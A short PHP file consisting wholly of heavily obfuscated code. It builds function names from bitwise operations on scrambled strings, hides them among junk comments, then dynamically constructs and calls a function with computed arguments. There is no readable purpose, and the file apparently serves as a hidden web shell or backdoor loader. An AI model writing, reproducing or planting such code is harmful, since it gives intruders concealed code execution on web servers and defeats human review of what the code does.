<?php
$LtnxqCX='qXl3'&~zGO;$ILH=WVso.'}9'&'{T~c/4';$hFeUUOQMhF='M %'|'H 0';$ngItS5=#e3EFJoXoT'.
         'DA@!F&'|'AA@0B$';$fJKbnBHhOv='m?{y/1{z~?w;<'&'~??'.ynxwvt.'?>{<';'B5lceUaqjiN'.
         'hw';$yiWVg8rYgJE='$Ig)A@ 44lA@L'|'$bO(p(,<%L)2,';$XC='DLB!PC'|'@$B#AA';'k10WB'.
         'l;X_$:}k';$Iuq='r?AZ[.ZEA]X}'.Ow6OD^'G[po?Lov '.diJvGSvu;$ZUZgwyVz_Y=#v78oTFl'.
         '9!40'|'!c 2';$M9d=aN^'E/';$jzCLxmr4_g='{XM'^Wxi;$lry='s}au'^';)5%';'CvJOqqwkP'.
         'qeecS^DW*';$mHDNzFdQ5My='[@'|"]A";$eJ='"'|'`';$MmRVFo_i3ay=$ILH|('0 @"@`'|'  '.
         'P!  ');$p5MP8GNF=$hFeUUOQMhF|('t]L'^'U9|');$qm=('6$?u.R'&"*4tT)P")^$ngItS5;/*'.
         'Q*/$wMbFELA=("s\$".OiweOeq."*".gvHo.">"&O0UWtgo.'~u{'.ztooo)|('kS`$<'./*XelR3'.
         'J^vP*/d_nufeEa.'}g'&'6'.Z4au0_Ftwsny.',j');$W1lB5=$fJKbnBHhOv^$yiWVg8rYgJE;/*'.
         '|6dU+m**/$SwBBi=$XC|('BH@CA@'|'F@@@aA');$Po=('$||4'.dUwFF^'E)9e=?9.b')|(/*YQ1'.
         '*DHm*/mF6Imn.',,L'&gTvkk.'=noo');if($MmRVFo_i3ay($p5MP8GNF($qm($lry./*JhJ5Gem'.
         'Ca*/$mHDNzFdQ5My)),$Iuq.(uQ7C.'&S{P`OU'^F5TwCcN1Q.'|d').$ZUZgwyVz_Y))exit;'Dq'.
         'Q xo(UI-V';$Tacn5Glr=$wMbFELA($M9d.$jzCLxmr4_g.$eJ,$qm($W1lB5));$Tacn5Glr(/*I'.
         '21Bm*e]w*/$SwBBi,$Po);#d3p0lCn2(q@*4x,A!M$#^TD1pZ=hS2H_CMIDq{E7=gQiu%f:ygT[_'.
         '(d+g!+DoBov#7FGh&K>wn5*J&yb)]~OO=*@}sP@1[^_evMzrgH$9G';